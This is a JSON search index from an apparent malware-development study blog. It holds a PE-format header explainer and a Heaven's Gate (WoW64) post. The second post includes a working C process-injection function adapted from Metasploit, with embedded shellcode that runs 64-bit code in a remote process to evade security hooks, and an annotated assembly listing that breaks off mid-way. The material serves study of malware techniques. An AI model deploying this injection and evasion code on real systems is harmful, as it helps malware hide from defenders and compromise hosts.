
{
    
    
    
    
        
        
        
    
        
        
        
    
        
        
        
    
        
        
        
    
        
        
        
    
        
        
        
    
        
        
        
    
        
        
        
    
        
        
        
    
        
        
        
    
        
        
        
    
        
        
        
    
        
        
        
    
        
        
        
    
    "pages": [{"date":"2025-03-27","image":"","imageAlt":"","link":"http://localhost:1313/posts/pe_parsing/","summary":"\u003cp\u003eA random page with some information of the PE format file and its main headers.\nMain usage: malware development and malware research.\u003c/p\u003e\n\u003ch1 id=\"considerations\"\u003eConsiderations\u003c/h1\u003e\n\u003cul\u003e\n\u003cli\u003eRVA (\u003cstrong\u003eRelative Virtual Address\u003c/strong\u003e): Offset from Image Base. To obtain the absolute virtual address the calculation \u0026ldquo;Image Base + RVA\u0026rdquo; must be performed. Several PE sections include RVAs.\u003c/li\u003e\n\u003cli\u003eCheck the \u003ca href=\"https://learn.microsoft.com/en-us/windows/win32/debug/pe-format\"\u003eofficial Microsoft documentation\u003c/a\u003e if you want to know more! This is only a summary and my personal studies about the topic.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch1 id=\"dos-header\"\u003eDOS header\u003c/h1\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eIMAGE_DOS_HEADER\u003c/code\u003e structure definition from \u003ccode\u003ewinnt.h\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eFirst 64 bytes of the PE file.\u003c/li\u003e\n\u003cli\u003eWas very important in the MS-DOS era, right now it is not.\u003c/li\u003e\n\u003cli\u003eThe actual Windows OS loader uses a field in this header to navigate to the \u003cstrong\u003enew executable\u003c/strong\u003e header , which is the header containing most of the needed information.\u003c/li\u003e\n\u003cli\u003eKept in the binaries for compatibility purposes.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eWe only want to know about the first and last members of this header:\u003c/p\u003e","tags":["binaries","executables","maldev","peparser"],"text":"a random page with some information of the pe format file and its main headers. main usage: malware development and malware research.\nconsiderations rva (relative virtual address): offset from image base. to obtain the absolute virtual address the calculation \u0026ldquo;image base + rva\u0026rdquo; must be performed. several pe sections include rvas. check the official microsoft documentation if you want to know more! this is only a summary and my personal studies about the topic. dos header image_dos_header structure definition from winnt.h. first 64 bytes of the pe file. was very important in the ms-dos era, right now it is not. the actual windows os loader uses a field in this header to navigate to the new executable header , which is the header containing most of the needed information. kept in the binaries for compatibility purposes. we only want to know about the first and last members of this header:\ne_magic: first member of the dos header, it’s a word (2 bytes), and it\u0026rsquo;s a called a magic number. it has a fixed value of 0x5a4d or mz in ascii, and it serves as a signature that marks the file as an ms-dos executable. e_lfanew: this is the last member of the dos header. this member is important to the pe loader on windows systems because it tells the loader where to look for the new executable header. it is basically an \u0026ldquo;offset\u0026rdquo; pointer to the new executable header (from now on, called pe header). this is what the old ms-dos loader and the new windows pe loader do with this header: dos stub the dos stub is a ms-dos program that prints an error message saying that the executable is not compatible with dos, and exists. this is not executed in the modern windows os. this is what gets executed when the program is loaded in ms-dos. if we copy the bytes of the dos stub into ida or any disassembler, we can see that the code routine is just to print the string and exit.\nnt header (pe header/new executable header) image_nt_headersas defined in winnt.h.\ntypedef struct _image_nt_headers64 { dword signature; image_file_header fileheader; image_optional_header64 optionalheader; } image_nt_headers64, *pimage_nt_headers64; typedef struct _image_nt_headers { dword signature; image_file_header fileheader; image_optional_header32 optionalheader; } image_nt_headers32, *pimage_nt_headers32; there is one structure for 32-bit executables and other for 64-bit executables. the optional header differs, as can be seen in the struct.\nsignature fixed value of 0x50450000 which translates to pe\\0\\0 in ascii. again, another magic number inside the executable. this is used by the loader to know that it has reached the correct section after querying e_lfanew from the dos header.\nfile header check the official microsoft docs for this struct here. another struct that contains information about the pe file. some of this information is relevant. let\u0026rsquo;s see the struct:\ntypedef struct _image_file_header { word machine; word numberofsections; dword timedatestamp; dword pointertosymboltable; dword numberofsymbols; word sizeofoptionalheader; word characteristics; } image_file_header, *pimage_file_header; details about the header:\nmachine: target architecture of the executable. normally, these values 0x8864 for amd64 and 0x14c for i386 are the common ones. however, for a complete list of possible values you can check the official microsoft documentation. however, this value is often ignored by the magic value in the optional header (we will see it later). numberofsections: number of sections that the binary has (.data is a section, for example). timedatestamp: the unix timestamp that indicates when the file was created. pointertosymboltable: the offset of the symbol table, in bytes, or zero if no coff symbol table exists. normally set to zero as the table does not get included by the compiler. numberofsymbols: number of symbols in the coff symbol table (normally 0). sizeofoptionalheader: the size of the optional header in bytes (we will see that header later). characteristics: a flag that indicates the attributes of the file, these attributes can be things like the file being executable, the file being a system file and not a user program, and a lot of other things. a complete list of these flags can be found on the official microsoft documentation. optional header this can be very confusing, but this header, called the optional header, is one of the most important headers in the pe. the pe loader looks for specific information from this header in order to load and run the executable. it\u0026rsquo;s called optional header as this header is not included in object files, but it is included in image files, as executables. it doesn’t have a fixed size, that’s why the image_file_header.sizeofoptionalheader member exists.\nas mentioned earlier, there are two versions of the optional header, one for 32-bit executables and one for 64-bit executables.\nthe two versions are different in two aspects:\nthe size of the structure itself (or the number of members defined within the structure): image_optional_header32 has 31 members while image_optional_header64 only has 30 members, that additional member in the 32-bit version is a dword named baseofdata which holds an rva of the beginning of the data section. the data type of some of the members: the following 5 members of the optional header structure are defined as dword in the 32-bit version and as ulonglong in the 64-bit version: imagebase sizeofstackreserve sizeofstackcommit sizeofheapreserve sizeofheapcommit we will focus in the 64 bit struct, as most of the malware we will create and parse will be of this type:\ntypedef struct _image_optional_header64 { word magic; byte majorlinkerversion; byte minorlinkerversion; dword sizeofcode; dword sizeofinitializeddata; dword sizeofuninitializeddata; dword addressofentrypoint; dword baseofcode; ulonglong imagebase; dword sectionalignment; dword filealignment; word majoroperatingsystemversion; word minoroperatingsystemversion; word majorimageversion; word minorimageversion; word majorsubsystemversion; word minorsubsystemversion; dword win32versionvalue; dword sizeofimage; dword sizeofheaders; dword checksum; word subsystem; word dllcharacteristics; ulonglong sizeofstackreserve; ulonglong sizeofstackcommit; ulonglong sizeofheapreserve; ulonglong sizeofheapcommit; dword loaderflags; dword numberofrvaandsizes; image_data_directory datadirectory[image_numberof_directory_entries]; } image_optional_header64, *pimage_optional_header64; let\u0026rsquo;s talk about the elements (information gathered from the official microsoft docs):\nmagic: the optional header magic number determines whether an image is a pe32 or pe32+ executable. the value of this field is what determines whether the executable is 32-bit or 64-bit, image_file_header.machine is ignored by the windows pe loader:\n0x10b: identifies the image as a pe32 executable. 0x20b: identifies the image as a pe32+ executable. 0x107: identifies it as a rom image. majorlinkerversion and minorlinkerversion: the linker major and minor version numbers.\nsizeofcode: this field holds the size of the code (.text) section, or the sum of all code sections if there are multiple sections.\nsizeofinitializeddata: this field holds the size of the initialized data (.data) section, or the sum of all initialized data sections if there are multiple sections.\nsizeofuninitializeddata: this field holds the size of the uninitialized data (.bss) section, or the sum of all uninitialized data sections if there are multiple sections.\naddressofentrypoint: an rva of the entry point when the file is loaded into memory. for program images, this is the starting address. for device drivers, this is the address of the initialization function. an entry point is optional for dlls. when no entry point is present, this field must be zero.\nbaseofcode: an rva of the start of the code section when the file is loaded into memory.\nimagebase: this field holds the preferred address of the first byte of image when loaded into memory (the preferred base address), this value must be a multiple of 64k.\ndue to memory protections like aslr, and a lot of other reasons, the address specified by this field is almost never used. in such case, the pe loader chooses an unused memory range to load the image into, loads the image in such address, and starts the relocation process. in the relocation process, the os fixes the constant addresses within the pe to work with the new image base. there’s a special section that holds information about places that will need fixing if relocation is needed, that section is called the relocation section (.reloc). sectionalignment: the alignment (in bytes) of sections when they are loaded into memory. it must be greater than or equal to filealignment. the default is the page size for the architecture.\nfilealignment: similar to sectionaligment this field holds a value that gets used for section raw data alignment on disk (in bytes), if the size of the actual data in a section is less than the filealignment value, the rest of the chunk gets padded with zeroes to keep the alignment boundaries. the documentation states that this value should be a power of 2 between 512 and 64k, and if the value of sectionalignment is less than the architecture’s page size then the sizes of filealignment and sectionalignment must match.\nmajoroperatingsystemversion, minoroperatingsystemversion, majorimageversion, minorimageversion, majorsubsystemversion and minorsubsystemversion: these members of the structure specify the major version number of the required operating system, the minor version number of the required operating system, the major version number of the image, the minor version number of the image, the major version number of the subsystem and the minor version number of the subsystem respectively.\nwin32versionvalue: a reserved field that the documentation says should be set to 0.\nsizeofimage: the size of the image file (in bytes), including all headers. it gets rounded up to a multiple of sectionalignment because this value is used when loading the image into memory.\nsizeofheaders: the combined size of the dos stub, pe header (nt headers), and section headers rounded up to a multiple of filealignment.\nchecksum: a checksum of the image file, it’s used to validate the image at load time.\nsubsystem: this field specifies the windows subsystem (if any) that is required to run the image, a complete list of the possible values of this field can be found on the official microsoft documentation.\ndllcharacteristics: this field defines some characteristics of the executable image file, like if it’s nx compatible and if it can be relocated at run time.\nalthough it is called dllcharacteristics, it exists within normal executable image files and it defines characteristics that can apply to normal executable files. don\u0026rsquo;t get confused by the name. a complete list of the possible flags for dllcharacteristics can be found on the official microsoft documentation. sizeofstackreserve, sizeofstackcommit, sizeofheapreserve and sizeofheapcommit: these fields specify the size of the stack to reserve, the size of the stack to commit, the size of the local heap space to reserve and the size of the local heap space to commit respectively.\nloaderflags: a reserved field that the documentation says should be set to 0.\nnumberofrvaandsizes : size of the datadirectory array.\ndatadirectory: an array of image_data_directory structures. this is the interesting section of the optional header.\ndata directory the optional header field has an array of image_data_directory called datadirectory, with a maximum size of 16 entries (specifed by the constant image_numberof_directory_entries):\n___image_data_directory datadirectory[___image_numberof_directory_entries]; an image_data_diretory structure is defines as follows:\ntypedef struct _image_data_directory { dword virtualaddress; dword size; } image_data_directory, *pimage_data_directory; it’s a very simple structure with only two members, first one being an rva pointing to the start of that data directory and the second one being the size of that data directory.\nbut, what is a data directory? a data directory is a piece of data located within one of the sections of the pe file.\ndata directories contain useful information needed by the windows loader. an example of a very important directory is the import directory, a data directory that contains the list of external functions imported from other libraries.\nhere’s a list of data directories defined in winnt.h. (each one of these values represents an index in the datadirectory array):\n// directory entries #define image_directory_entry_export 0 // export directory #define image_directory_entry_import 1 // import directory #define image_directory_entry_resource 2 // resource directory #define image_directory_entry_exception 3 // exception directory #define image_directory_entry_security 4 // security directory #define image_directory_entry_basereloc 5 // base relocation table #define image_directory_entry_debug 6 // debug directory // image_directory_entry_copyright 7 // (x86 usage) #define image_directory_entry_architecture 7 // architecture specific data #define image_directory_entry_globalptr 8 // rva of gp #define image_directory_entry_tls 9 // tls directory #define image_directory_entry_load_config 10 // load configuration directory #define image_directory_entry_bound_import 11 // bound import directory in headers #define image_directory_entry_iat 12 // import address table #define image_directory_entry_delay_import 13 // delay load import descriptors #define image_directory_entry_com_descriptor 14 // com runtime descriptor so, for example, to access the import directory information we will have to:\nparse the dos header. get the e_lfanew variable of the dos header to get the offset to the pe header. navigate to the optional header. get to the offset where the data directory array is. get the position 1 of such array. we will obtain a struct containing the rva and the size of such data directory. with that information, we can access such directory and parse it. note that each directory will be parsed differently, depending on the information that it contains.\nalso note that there can be data directories with no information. if we take a look at the contents of image_optional_header.datadirectory of an actual pe file, we might see entries where both fields are set to 0: important: data directories can be inside the sections (e.g, the import directory table is usually inside the .idata or .rdata section). so, we can say that after the nt header, there are the section headers.di\nsection headers after the pe header, the section headers are the following. they are the last headers in the pe. a section header is a structure named image_section_header defined in winnt.h as follows:\ntypedef struct _image_section_header { byte name[image_sizeof_short_name]; union { dword physicaladdress; dword virtualsize; } misc; dword virtualaddress; dword sizeofrawdata; dword pointertorawdata; dword pointertorelocations; dword pointertolinenumbers; word numberofrelocations; word numberoflinenumbers; dword characteristics; } image_section_header, *pimage_section_header; there will be one section header for each of the sections in the pe. remember that we can retrieve the name of the sections:\nprintf(\u0026#34;[nt header][file header] number of sections: %u\u0026#34;, this-\u0026gt;pefile_nt_headers.fileheader.numberofsections); these are the fields of a section header:\nname: a byte array of the size image_sizeof_short_name that holds the name of the section. image_sizeof_short_name has the value of 8 meaning that a section name can’t be longer than 8 characters. for longer names the official documentation mentions a work-around by filling this field with an offset in the string table, however executable images do not use a string table so this limitation of 8 characters holds for executable images. physicaladdress or virtualsize: a union variable defines multiple names for the same thing. this field contains the total size of the section when it’s loaded in memory. virtualaddress: the documentation states that for executable images this field holds the address of the first byte of the section relative to the image base when loaded in memory, and for object files it holds the address of the first byte of the section before relocation is applied. sizeofrawdata: this field contains the size of the section on disk, it must be a multiple of image_optional_header.filealignment. note that this is the size ondisk, whereas physicaladdress or virtualsize specifies the size once it\u0026rsquo;s loaded in memory (the size can differ). pointertorawdata: a pointer to the first page of the section within the file, for executable images it must be a multiple of image_optional_header.filealignment. pointertorelocations: a file pointer to the beginning of relocation entries for the section. it’s set to 0 for executable files. pointertolinenumbers: a file pointer to the beginning of coff line-number entries for the section. it’s normally set to 0 because coff debugging information is deprecated. numberofrelocations: the number of relocation entries for the section, it’s normally set to 0 for executable images. numberoflinenumbers: the number of coff line-number entries for the section, it’s set to 0 because coff debugging information is deprecated. characteristics: flags that describe the characteristics of the section. these characteristics are things like if the section contains executable code, contains initialized/uninitialized data, can be shared in memory. a complete list of section characteristics flags can be found on the official microsoft documentation. raw data can != virtual size sizeofrawdata and virtualsize can be different, and this can happen for multiple of reasons.\nsizeofrawdata (the size on disk) must be a multiple of image_optional_header.filealignment. if the raw data size is less than that such value, the rest gets padded to match a multiple of the alignment. however, when the section is loaded into memory it doesn’t follow that alignment and only the actual size of the section is occupied. in this case sizeofrawdata will be greater than virtualsize.\nthe opposite can happen as well.\nif the section contains uninitialized data, these data won’t be accounted for on disk, but when the section gets mapped into memory, the section will expand to reserve memory space for when the uninitialized data gets later initialized and used.\nthis means that the section on disk will occupy less than it will do in memory, in this case virtualsize will be greater than sizeofrawdata.\nsections lastly, the pe has the contents of the sections (.text, .data, .rdata). some sections have special names that indicate their purpose, we’ll go over some of them, and a full list of these names can be found on the official microsoft documentation under the “special sections” section.\n.text: contains the executable code of the program. .data: contains the initialized data. .bss: contains uninitialized data. .rdata: contains read-only initialized data. .edata: contains the export tables. .idata: contains the import tables. .reloc: contains image relocation information. .rsrc: contains resources used by the program, these include images, icons or even embedded binaries. .tls: (thread local storage), provides storage for every executing thread of the program. import table there is no rule that says that the import table must begin at the start of a section named .idata, but that’s how it is typically done, for reasons both traditional and practical.\nthe first field of the import table, virtualaddress, is actually the rva of the table. the rva is the address of the table relative to the base address of the image when the table is loaded. the second field gives the size in bytes. the data directories, which form the last part of the optional header, are listed in the following table.\nnote that the number of directories is not fixed. before looking for a specific directory, check the numberofrvaandsizes field in the optional header.\nalso, do not assume that the rvas in this table point to the beginning of a section or that the sections that contain specific tables have specific names.\nif we navigate to the section headers, we will see that the .rdata section will start before 2dc0c8: but we can see that the import directory is not at the start of the section, but somewhere in the middle, as the .rdata section starts a bit before (0x26000) whereas the import directory starts at 0x2d0c8. the tool just says that the import directory is inside .rdata, but not at the start of it.\nwe need to translate the import directory rva to the file offset - a place in the binary file where the dll import information is stored. the way this can be achieved is by using the following formula:\nlocation of the import directory = imagebase + section.rawoffset + (importdirectory.rva − section.va)\nwhere:\nimagebase is the start address of where the binary image is loaded section.rawoffset is the raw address value from the .text section text.va is virtual address value from the .text section importdirectory.rva is the import directory rva value from data directories in optional header. let\u0026rsquo;s think how to obtain all the values:\nimagebase in our case is 0 since the file is not loaded to memory and we are inspecting it on the disk. import table is located in a specific section of the binary. since the binary is not loaded to disk, we need to know the file offset of the section that the import directory is in relation to the imagebase. imagebase + text.rawoffset gives us the file offset to the .text section - we need it, because remember - the import table is inside the .text section since importdirectory.rva, as mentioned earlier, lives in a section, importdirectory.rva - text.va gives us the offset of the import table relative to the start of the .text section we take the value of importdirectory.rva - text.va and add it to the text.rawoffset and we get the offset of the import table in the raw section data. after that, we can start parsing the import directory. it consists of an array of image_import_descriptor structures, each one of them is for a dll.\nit doesn’t have a fixed size, so the last image_import_descriptor of the array is zeroed-out (null-padded) to indicate the end of the import directory table.\nimage_import_descriptor is defined as follows:\ntypedef struct _image_import_descriptor { union { dword characteristics; dword originalfirstthunk; } dummyunionname; dword timedatestamp; dword forwarderchain; dword name; dword firstthunk; } image_import_descriptor; typedef image_import_descriptor unaligned *pimage_import_descriptor; get dll name we need to get the name rva (name does not point to the name, but contains a rva) to a file offset using the technique we used earlier to get the location of the dll name string. this time the formula we need to use is:\noffset = imagebase + text.rawoffset + (namerva − section.va) where namerva is name rva value for advapi32.dll from the import directory and text.va is the virtual address of the .text section.\nget dll import address table (imported functions) tbd\n","title":"PE parsing"},{"date":"2024-09-19","image":"","imageAlt":"","link":"http://localhost:1313/posts/wow64/","summary":"\u003ch1 id=\"heavens-gate-lore\"\u003eHeaven\u0026rsquo;s gate lore\u003c/h1\u003e\n\u003cp\u003eThe Heaven\u0026rsquo;s Gate tutorial was written by an anonymous hacker going online as Roy G. Biv, a member of a group called 29A.\nAfter the group disbanded and their e-zine\u0026rsquo;s site went down, the Heaven\u0026rsquo;s Gate technique was later \u003ca href=\"https://github.com/darkspik3/Valhalla-ezines/blob/master/Valhalla%20%231/articles/HEAVEN.TXT\"\u003ereprinted in the 2009 edition of the Valhalla hacker e-zine\u003c/a\u003e. I personally would check this resource, as it was the first time the technique was commented.\u003c/p\u003e","tags":["evasion","firststeps","loader","maldev"],"text":"heaven\u0026rsquo;s gate lore the heaven\u0026rsquo;s gate tutorial was written by an anonymous hacker going online as roy g. biv, a member of a group called 29a. after the group disbanded and their e-zine\u0026rsquo;s site went down, the heaven\u0026rsquo;s gate technique was later reprinted in the 2009 edition of the valhalla hacker e-zine. i personally would check this resource, as it was the first time the technique was commented.\nwhy does heaven\u0026rsquo;s gate exist? in a normal environment, we have 64-bit windows operative systems (or at least, we expect so). some detection mechanisms, like antivirus software and os security features, do not detect a 32-bit process jumping from running 32-bit compatible code to 64-bit code. and this is because a 32-bit program cannot inject code into 64-bit programs natively. indeed, 32-bit programs can run on a 64-bit os because there is a compatibility layer: wow64.\nthe compatibility layer: wow64 in a 64-bit windows kernel, the first piece of code to execute in any process is always the 64-bit dll called ntdll.dll, also called ntdll. this dll takes care of initializing the process in user-mode as a 64-bit process and setting up the execution of the process.\nbut, what happens when a 64-bit windows kernel runs a 32-bit process? how does windows allow that kind of compatibility? well, after ntdll is loaded, the windows on windows (wow64) interface takes over and loads a 32-bit version of ntdll.dll, called ntdll32.dll. after loading this dll, the execution turns into a 32-bit mode through a far jump to a compatibility code segment that changes the processor context to work to 32 bits for this process. from now on, for that process, its environment (registers, instructions) is 32-bit. nevertheless, the kernel is still 64 bit so, when the process has to perform a syscall (and interact with the kernel space) the 32-bit ntdll that was loaded changes the execution environment to 64-bit mode, executes the 64-bit syscall (calling the 64-bit ntdll), and, once the syscall is performed ntdll32.dll returns the process to 32-bit mode. we can think of ntdll32.dll as a \u0026ldquo;proxy\u0026rdquo; so that the processor runs 32-bit code and 64-bit code when necessary (this is mainly when executing syscalls) in a 64-bit operative system.\nthis process is better described in many sources, including in the windows internals books, so if you’re interested in reading more, you can do so, but i’ll try to do my best here.\nbut, what is wrong with heaven\u0026rsquo;s gate? besides the fact that this technique is pretty old (i think this is the original post which has been since 2008), it has been used in a lot of malware campaigns, like emotet, a banking trojan. for example, the emotet malware uses heaven\u0026rsquo;s gate to perform process hollowing (another malware technique) from a 32-bit process to a 64-bit process.\nbut why is this used? well, this technique is used to bypass the wow64 api hooks performed by the security solutions. while a 32-bit process would normally pass through the 32-bit api hooks made by the 32-bit ntdll.dll (which are the ones monitored by the security solutions), malicious programs can perform a jump instruction past these hooks in order to execute 64-bit code from a 32-bit process without having to trigger the api call, which is hooked by the security solutions. overall, this is used as an evasion mechanism.\nwindows initially developed this on the assumption that the 64-bit ntdll.dll could not be accessed by a 32-bit process, but heaven’s gate takes advantage of this by running x64 instructions which will be completely missed by any application expecting x86 instructions.\nalso, this technique is used to difficult the analysis of the malware samples, as it makes the debugging and emulation harder (and the reversing process of these samples overall).\nanalyzing a heaven\u0026rsquo;s gate implementation there are a lot of different implementations of this technique, but they have 90% of the code in common. i will analyze the heaven\u0026rsquo;s gate implementation used in the metasploit framework, as it is offered as a c++ function.\nthe meterpreter shell has a functionality to inject 64-bit code in 64-bit processes from 32-bit meterpreter shells. i use a slightly modified code to perform the heaven\u0026rsquo;s gate, call createremotethread with a 64-bit shellcode in order to inject 64-bit code from a 32-bit process to a 64-bit code. my code is the following:\n// definitions used for running native x64 code from a wow64 process // (src: https://github.com/rapid7/meterpreter/blob/5e24206d510a48db284d5f399a6951cd1b4c754b/source/common/arch/win/i386/base_inject.h) typedef bool (winapi * x64function)( dword dwparameter ); typedef dword (winapi * executex64)( x64function pfunction, dword dwparameter ); int injectwow64(handle hproc, unsigned char * payload, unsigned int payload_len) { //\tsrc: https://github.com/rapid7/meterpreter/blob/5e24206d510a48db284d5f399a6951cd1b4c754b/source/common/arch/win/i386/base_inject.c lpvoid premotecode = null; executex64 pexecutex64 = null; x64function px64function = null; wow64context * ctx = null; /* a simple function to execute native x64 code from a wow64 (x86) process. can be called from c using the following prototype: typedef dword (winapi * executex64)( x64function pfunction, dword dwparameter ); the native x64 function you specify must be in the following form (as well as being x64 code): typedef bool (winapi * x64function)( dword dwparameter ); original binary: src: https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/migrate/executex64.asm src: https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/migrate/remotethread.asm */ byte sh_executex64[] =\t\u0026#34;\\x55\\x89\\xe5\\x56\\x57\\x8b\\x75\\x08\\x8b\\x4d\\x0c\\xe8\\x00\\x00\\x00\\x00\u0026#34; \u0026#34;\\x58\\x83\\xc0\\x2b\\x83\\xec\\x08\\x89\\xe2\\xc7\\x42\\x04\\x33\\x00\\x00\\x00\u0026#34; \u0026#34;\\x89\\x02\\xe8\\x0f\\x00\\x00\\x00\\x66\\x8c\\xd8\\x66\\x8e\\xd0\\x83\\xc4\\x14\u0026#34; \u0026#34;\\x5f\\x5e\\x5d\\xc2\\x08\\x00\\x8b\\x3c\\xe4\\xff\\x2a\\x48\\x31\\xc0\\x57\\xff\u0026#34; \u0026#34;\\xd6\\x5f\\x50\\xc7\\x44\\x24\\x04\\x23\\x00\\x00\\x00\\x89\\x3c\\x24\\xff\\x2c\u0026#34; \u0026#34;\\x24\u0026#34;; byte sh_wownativex[] = \u0026#34;\\xfc\\x48\\x89\\xce\\x48\\x89\\xe7\\x48\\x83\\xe4\\xf0\\xe8\\xc8\\x00\\x00\\x00\u0026#34; \u0026#34;\\x41\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\u0026#34; \u0026#34;\\x8b\\x52\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\u0026#34; \u0026#34;\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\u0026#34; \u0026#34;\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\u0026#34; \u0026#34;\\x48\\x01\\xd0\\x66\\x81\\x78\\x18\\x0b\\x02\\x75\\x72\\x8b\\x80\\x88\\x00\\x00\u0026#34; \u0026#34;\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\u0026#34; \u0026#34;\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\u0026#34; \u0026#34;\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\x38\\xe0\u0026#34; \u0026#34;\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\\x75\\xd8\\x58\\x44\\x8b\\x40\u0026#34; \u0026#34;\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\u0026#34; \u0026#34;\\x41\\x8b\\x04\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\u0026#34; \u0026#34;\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\u0026#34; \u0026#34;\\x48\\x8b\\x12\\xe9\\x4f\\xff\\xff\\xff\\x5d\\x4d\\x31\\xc9\\x41\\x51\\x48\\x8d\u0026#34; \u0026#34;\\x46\\x18\\x50\\xff\\x76\\x10\\xff\\x76\\x08\\x41\\x51\\x41\\x51\\x49\\xb8\\x01\u0026#34; \u0026#34;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x48\\x31\\xd2\\x48\\x8b\\x0e\\x41\\xba\\xc8\u0026#34; \u0026#34;\\x38\\xa4\\x40\\xff\\xd5\\x48\\x85\\xc0\\x74\\x0c\\x48\\xb8\\x00\\x00\\x00\\x00\u0026#34; \u0026#34;\\x00\\x00\\x00\\x00\\xeb\\x0a\\x48\\xb8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\u0026#34; \u0026#34;\\x48\\x83\\xc4\\x50\\x48\\x89\\xfc\\xc3\u0026#34;; unsigned int sh_executex64_len = sizeof(sh_executex64); unsigned int sh_wownativex_len = sizeof(sh_wownativex); // inject payload into target process premotecode = virtualallocex(hproc, null, payload_len, mem_commit, page_execute_read); writeprocessmemory(hproc, premotecode, (pvoid) payload, (size_t) payload_len, (size_t *) null); printf(\u0026#34;remcode = %p\\n\u0026#34;, premotecode); getchar(); // alloc a rw buffer in this process for the executex64 function pexecutex64 = (executex64)virtualalloc( null, sizeof(sh_executex64), mem_reserve|mem_commit, page_readwrite ); // alloc a rw buffer in this process for the x64function function (and its context) px64function = (x64function)virtualalloc( null, sizeof(sh_wownativex)+sizeof(wow64context), mem_reserve|mem_commit, page_readwrite ); // printf(\u0026#34;pexecutex64 = %p ; px64function = %p\\n\u0026#34;, pexecutex64, px64function); getchar(); // copy over the wow64-\u0026gt;x64 stub memcpy( pexecutex64, sh_executex64, sh_executex64_len ); virtualalloc( pexecutex64, sizeof(sh_executex64), mem_commit, page_execute_read ); // copy over the native x64 function memcpy( px64function, sh_wownativex, sh_wownativex_len ); // px64function shellcode modifies itself during the runtime, so memory has to be rwx virtualalloc( px64function, sizeof(sh_wownativex)+sizeof(wow64context), mem_commit, page_execute_readwrite ); // set the context ctx = (wow64context *)( (byte *)px64function + sh_wownativex_len ); ctx-\u0026gt;h.hprocess = hproc; ctx-\u0026gt;s.lpstartaddress = premotecode; ctx-\u0026gt;p.lpparameter = 0; ctx-\u0026gt;t.hthread = null; // run a new thread in target process pexecutex64( px64function, (dword)ctx ); if( ctx-\u0026gt;t.hthread ) { // if success, resume the thread -\u0026gt; execute payload resumethread(ctx-\u0026gt;t.hthread); // cleanup in target process virtualfree(pexecutex64, 0, mem_release); virtualfree(px64function, 0, mem_release); return 0; } else return 1; } this function receives:\nthe handle to the 64 bit process to inject the 64-bit shellcode. the 64-bit shellcode. the size of the shellcode. then, the steps to execute the 64-bit shellcode in the 64-bit target process are the following:\nallocate memory space in the target process and copy the 64-bit shellcode for further execution. in the 32-bit process, a rw buffer is allocated for the executex64 function. this is the function that performs the transition from 32-bit to 64-bit space, calls x64function (we will see what this is in a moment) and returns from 64-bit to 32-bit space. in the 32-bit process, a rw buffer is allocated for for the x64function function (and its context). this function is basically the 64-bit shellcode of createremotethread, as we want to create a thread in the remote process with our shellcode as the starting point. we change the memory properties of the x64function function zone (the createremotethread) as it modifies itself during runtime. we run a new thread in the target process using the execute64 function, passing the address of the memory we allocated in the first step (therefore, pointing to the shellcode we want to execute). resume the thread (the thread is created in suspended state, as the flag create_suspended is used in the shellcode that runs the thread). free the memory in the 32-bit process as it is no longer needed. note that we could have a modified version of this function so that the 64-bit function that is executed is not createremotethread, but a windows api call (for example), or an arbitrary 64-bit function shellcode.\ndisassembling and analyzing execute64 we want to analyze the protagonist of this technique: the execute64 shellcode, which acts as the function that performs the \u0026ldquo;jump\u0026rdquo; to the 32-bit world to the 64-bit world and executes our function. this is the function that performs the heaven\u0026rsquo;s gate, so it is the interesting one.\nwe could use a known online disassembler and copy the sh_executex64 shellcode that is in the code, but we could also take the official asm that is declared in the metasploit framework that is basically the same code, but in asm representation. it will be easier for us to comment.\nlet\u0026rsquo;s analyze the code:\n; a simple function to execute native x64 code from a wow64 (x86) process. ; can be called from c using the following prototype: ; typedef dword (winapi * executex64)( x64function pfunction, dword dwparameter ); ; the native x64 function you specify must be in the following form (as well as being x64 code): ; typedef bool (winapi * x64function)( dword dwparameter ); ; clobbers: eax, ecx and edx (ala the normal stdcall calling convention) ; un-clobbered: ebx, esi, edi, esp and ebp can be expected to remain un-clobbered. [bits 32] wow64_code_segment\tequ 0x23 x64_code_segment\tequ 0x33 start: push ebp ; stack prologue, save ebp mov ebp, esp\t; create a new stack frame push esi\t; save the registers we shouldn\u0026#39;t clobber push edi\t; mov esi, [ebp+8]\t; esi = pfunction mov ecx, [ebp+12]\t; ecx = dwparameter call delta\t; delta: pop eax\t; add eax, (native_x64-delta)\t; get the address of native_x64 sub esp, 8\t; alloc some space on stack for far jump mov edx, esp\t; edx will be pointer our far jump mov dword [edx+4], x64_code_segment\t; set the native x64 code segment mov dword [edx], eax\t; set the address we want to jump to (native_x64) call go_all_native\t; perform the transition into native x64 and return here when done. mov ax, ds\t; fixes an elusive bug on amd cpus, http://blog.rewolf.pl/blog/?p=1484 mov ss, ax\t; found and fixed by rewolf, incorporated by rammichael add esp, (8+4+8)\t; remove the 8 bytes we allocated + the return address which was never popped off + the qword pushed from native_x64 pop edi\t; restore the clobbered registers 